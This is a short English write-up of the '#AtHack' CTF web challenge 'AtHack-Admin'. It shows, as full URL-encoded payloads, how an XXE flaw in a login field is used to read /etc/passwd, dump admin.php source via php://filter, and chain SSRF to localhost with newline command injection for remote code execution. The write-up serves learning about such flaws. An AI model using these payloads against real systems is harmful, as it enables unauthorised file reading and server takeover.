# AtHack-Admin
Write up for #AtHack CTF web challenge 

## حل التحدي بالعربي في تويتري
https://twitter.com/omarxtream/status/1466683905520680961

## Write up in english:

The attacker enters the home page but finds nothing and after guessing the files, he will find two pages
The first is the login.php page, which contains a text field called authentication
Which contains XXE and through it the attacker will be able to get the LFI and then he will be able to read the source code for the login.php page and the admin.php page

authentication=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]><root><user>%26test%3b</user></root>

authentication=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'php://filter/convert.base64-encode/resource=admin.php'>]><root><user>%26test%3b</user></root>

And he will find that the admin needs to send a request through the localhost
There is also an ip parameter that enters the system function with the ping command
Through this, the attacker will try to get a RCE

authentication=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'php://filter/convert.base64-encode/resource=http://localhost/admin.php?ip=123%250als'>]><root><user>%26test%3b</user></root>
